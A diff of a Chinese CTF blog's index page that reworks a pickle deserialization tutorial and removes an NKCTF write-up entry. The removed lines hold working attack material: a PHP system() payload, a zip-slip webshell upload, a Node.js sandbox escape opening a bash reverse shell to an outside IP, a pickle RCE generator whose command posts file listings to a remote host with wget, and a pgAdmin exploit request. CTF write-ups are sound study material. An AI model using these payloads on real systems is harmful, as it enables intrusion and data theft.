@@ -153,15 +153,22 @@
   <div class="row">
 	
 	
-		<p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>
+		<span id="more"></span>
+<p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>
 PVM 由三部分组成：</p>
 <ol>
-<li class="lvl-3"><strong>指令处理器</strong><br>
-从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。  最终留在栈顶的值将被作为反序列化对象返回。</li>
-<li class="lvl-3"><strong>stack</strong><br>
-由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</li>
-<li class="lvl-3"><strong>memo</strong><br>
-由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</li>
+<li class="lvl-3">
+<p><strong>指令处理器</strong><br>
+从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。  最终留在栈顶的值将被作为反序列化对象返回。</p>
+</li>
+<li class="lvl-3">
+<p><strong>stack</strong><br>
+由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p>
+</li>
+<li class="lvl-3">
+<p><strong>memo</strong><br>
+由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p>
+</li>
 </ol>
 <p>pickle在(反)序列化中用到的函数</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">pickle.dump(文件) </span><br><span class="line">pickle.dumps(字符串)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化</span></span><br><span class="line">pickle.load(文件)</span><br><span class="line">pickle.loads(字符串) </span><br></pre></td></tr></table></figure>
@@ -210,7 +217,7 @@ PVM 由三部分组成：</p>
 <p>pickle序列化后的数据是opcode,它相对其他语言所用的json格式而言易读性稍差,但是能够储存更多的python数据结构,随着python的更新迭代,opcode也有几个版本</p>
 <h1>OPCODE</h1>
 <p>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python</p>
-<p><img src="D:%5CObisidian%5CP4nY0O%5Cpictures%5Copcode.png" alt="opcode"><br>
+<p><img src="%5Cpic%5Copcode.png" alt="opcode"><br>
 常用操作码:</p>
 <ul class="lvl-0">
 <li class="lvl-2">
@@ -502,7 +509,7 @@ pan\27104</p>
 </li>
 </ol>
 <p>这里我们暂时只用一道# [watevrCTF-2019]Pickle Store来举例展示</p>
-<p>![pickle shop](D:\Obisidian\P4nY0O\pictures\pickle shop.png)<br>
+<p><img src="%5Cpic%5Cpickle_shop.png" alt="pickle_shop"><br>
 题目进去是一个商店界面,初始有500刀,得到flag需要购买1000刀的Flag Pickle<br>
 然后购买上面两个商品发现每次购买后COOKIE的session都会改变,base64解码后可以发现是用pickle序列化后的数据</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span>  </span><br><span class="line"><span class="built_in">print</span>(b64decode(enc))</span><br><span class="line"><span class="comment">#输出b&#x27;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M|\x01X\x07\x00\x00\x00historyq\x02]q\x03(X\x14\x00\x00\x00Yummy sm\xc3\xb6rg\xc3\xa5sgurkaq\x04X\x15\x00\x00\x00Yummy standard pickleq\x05X\x15\x00\x00\x00Yummy standard pickleq\x06eX\x10\x00\x00\x00anti_tamper_hmacq\x07X \x00\x00\x0080753869fa383e8ac5d6aba3abae7dc3q\x08u.&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -577,102 +584,6 @@ base64编码后，抓下购买flag的包，修改其中的cookie发送</p>
 	
 	</div>
   <a type="button" href="/2024/03/29/pickle/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/26/nkwp/" ></a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-26  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1>WEB</h1>
-<h1>my_first_cms</h1>
-<p>题目是的框架用的是cms-made-simple</p>
-<blockquote>
-<p>后台密码弱口令</p>
-<p>admin/Admin123</p>
-</blockquote>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>1 ) log in as admin and go to Extensions &gt; User Defined Tags &gt;</p>
-</li>
-<li class="lvl-2">
-<p>2 ) Write in Code place payload &gt; <?php echo system('id'); ?></p>
-</li>
-<li class="lvl-2">
-<p>3 ) After click run you will be see result :</p>
-</li>
-</ul>
-<p>uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)</p>
-<p>漏洞文章<a target="_blank" rel="noopener" href="https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/">https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/</a> 省流版<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html">https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html</a></p>
-<h3 id="工作原理">工作原理</h3>
-<p>用户自定义标签通过将PHP代码与Smarty模板引擎识别的标签关联起来。当Smarty解析模板遇到该标签时，它会执行相关的PHP代码，并将标签标记替换为PHP代码的输出</p>
-<p>一开始我自己找到的文章不对，是这个框架的另一个SSTI洞，后来5x给出了正确的漏洞文章，按步骤找到对应页面粘贴上payload，换成 <code>ls /</code>然后<code>cat flag</code>皆可</p>
-<p>![40b9384456aeae3016062060cf03580](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\40b9384456aeae3016062060cf03580.png)</p>
-<h1>用过就是熟悉</h1>
-<blockquote>
-<p>用户账号密码在数据库文件中</p>
-</blockquote>
-<p>admin/!@!@!@!@NKCTFNKCTFChu0</p>
-<p>guest/!@!@!@!@NKCTFChu0</p>
-<p>在本地搞个压缩包，里面放webshell</p>
-<p>php一句话即可</p>
-<p>登录后台，将压缩包上传</p>
-<p><a target="_blank" rel="noopener" href="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA">https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA</a></p>
-<p>修改数据包中的pathto为%7D%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f</p>
-<p>之后就能跨目录解压到</p>
-<p>![1da6d831c4a17030fdbe4fb2765e01a](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\1da6d831c4a17030fdbe4fb2765e01a.png)</p>
-<p><a target="_blank" rel="noopener" href="http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/">http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/</a>}/shell.php</p>
-<p>![3d8382a0cabc9f8c87831f01ef0e3f9](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\3d8382a0cabc9f8c87831f01ef0e3f9.png)</p>
-<blockquote>
-<p>这题主要利用的漏洞是压缩包slip</p>
-</blockquote>
-<p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p>
-<p>利用此漏洞有两个前提：</p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>有恶意的压缩文件（这一点我们可以自己构造）</p>
-</li>
-<li class="lvl-2">
-<p>提取代码不会执行目录检查。</p>
-</li>
-</ul>
-<p>恶意的压缩文件一般包含<code>../</code>目录，从而解压时会跳出当前目录。</p>
-<p>提取代码一般会得到压缩文件中的文件目录，如果不对这些目录进行校验则会出现slip问题</p>
-<p>现在很多cms中还存在这种漏洞</p>
-<h1>最简单的CTF</h1>
-<p>题目有一个js代码的提交窗口，可以填入任意代码submit，访问/secret路由有源码，源码有waf</p>
-<p>反弹shell,大小写绕过,getOwnPropertyDescriptor获取所有属性值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const code = `throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">        const cc = arguments.callee.caller;</span><br><span class="line">        const p = (cc.constructor.constructor(&#x27;return PROCESS&#x27;.toLowerCase()))();</span><br><span class="line">        return Object.getOwnPropertyDescriptor(p.mainModule.require(&#x27;child_Process&#x27;.toLowerCase()), &#x27;EXEC&#x27;.toLowerCase()).value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.225.25/2333 0&gt;&amp;1&quot;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
-<p>![a366152fa528f42583c784c3d52d3c4](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\a366152fa528f42583c784c3d52d3c4.png)</p>
-<h1>attack_tacooooo</h1>
-<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a> 没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\\\\x80\\\\x04\\\\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\\\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\\\\x94\\\\x8c\\\\x06system\\\\x94\\\\x93\\\\x94&#x27;</span><br><span class="line">    b += b&#x27;\\\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\\\\x94\\\\x85\\\\x94R\\\\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    HOST = &#x27;1.1.1.1:8000&#x27;</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;wget &lt;http://121.40.98.237:7777&gt; --post-data=`ls /usr/bin|base64|tr -d &#x27;\\\\n&#x27;`&quot;))</span><br></pre></td></tr></table></figure>
-<p>运行上面的<code>pickler.py</code></p>
-<p>得到posix.pickle文件后</p>
-<p>登录web服务器，账号密码分别为<code>tacooooo@qq.com</code>/tacooooo`</p>
-<p>点</p>
-<p>将生成的posix.pickle文件上传</p>
-<p>然后发送下面的数据包,就能执行命令了，看服务器对应的回显就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /browser/ HTTP/1.1</span><br><span class="line">Host: ee86fb88-5fd5-4f9c-9f6d-68b490e101d8.node.nkctf.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: &lt;http://9dbb3625-3439-4b7c-bea5-29ec33888059.node.nkctf.yuzhian.com.cn/login&gt;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=zh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2024/03/26/nkwp/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -889,11 +800,11 @@ base64编码后，抓下购买flag的包，修改其中的cookie发送</p>
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/WP/">WP<span>1</span></a></li>
+			<li><a href="/tags/碎碎念/">碎碎念<span>1</span></a></li>
 		
 			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
 		
-			<li><a href="/tags/碎碎念/">碎碎念<span>1</span></a></li>
+			<li><a href="/tags/WP/">WP<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -908,10 +819,6 @@ base64编码后，抓下购买flag的包，修改其中的cookie发送</p>
     
       <li>
         <a href="/2024/03/29/pickle/" ><i class="fa fa-file-o"></i>pickle</a>
-      </li>
-    
-      <li>
-        <a href="/2024/03/26/nkwp/" ><i class="fa fa-file-o"></i></a>
       </li>
     
       <li>
